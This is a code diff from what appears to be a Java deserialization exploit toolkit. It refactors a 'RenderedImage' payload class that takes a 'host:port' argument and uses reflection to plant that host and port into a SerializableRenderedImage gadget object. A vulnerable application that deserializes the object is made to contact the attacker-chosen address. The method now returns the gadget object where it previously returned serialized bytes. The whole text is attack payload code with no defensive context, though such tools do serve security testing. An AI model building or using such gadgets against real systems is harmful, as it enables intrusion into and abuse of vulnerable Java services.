@@ -13,7 +13,7 @@ import java.net.InetAddress;
 
 public class RenderedImage implements ObjectPayload<Object> {
     @Override
-    public byte[] getBytes(PayloadType type, String... param) throws Exception {
+    public Object getObject(PayloadType type, String... param) throws Exception {
         String command = param[0];
         int    sep     = command.lastIndexOf(':');
         if (sep < 0) {
@@ -30,19 +30,9 @@ public class RenderedImage implements ObjectPayload<Object> {
         Reflections.setFieldValue(serializableRenderedImage, "port", Integer.parseInt(port));
         Reflections.setFieldValue(serializableRenderedImage, "host", InetAddress.getByName(host));
 
-        ByteArrayOutputStream baous = new ByteArrayOutputStream();
-        ObjectOutputStream    oos   = new ObjectOutputStream(baous);
-        oos.writeObject(serializableRenderedImage);
-        byte[] bytes = baous.toByteArray();
-        oos.close();
-
-        return bytes;
+        return serializableRenderedImage;
     }
 
-    @Override
-    public Object getObject(String command) throws Exception {
-        return null;
-    }
 
     public static byte hexToByte(String inHex) {
         return (byte) Integer.parseInt(inHex, 16);
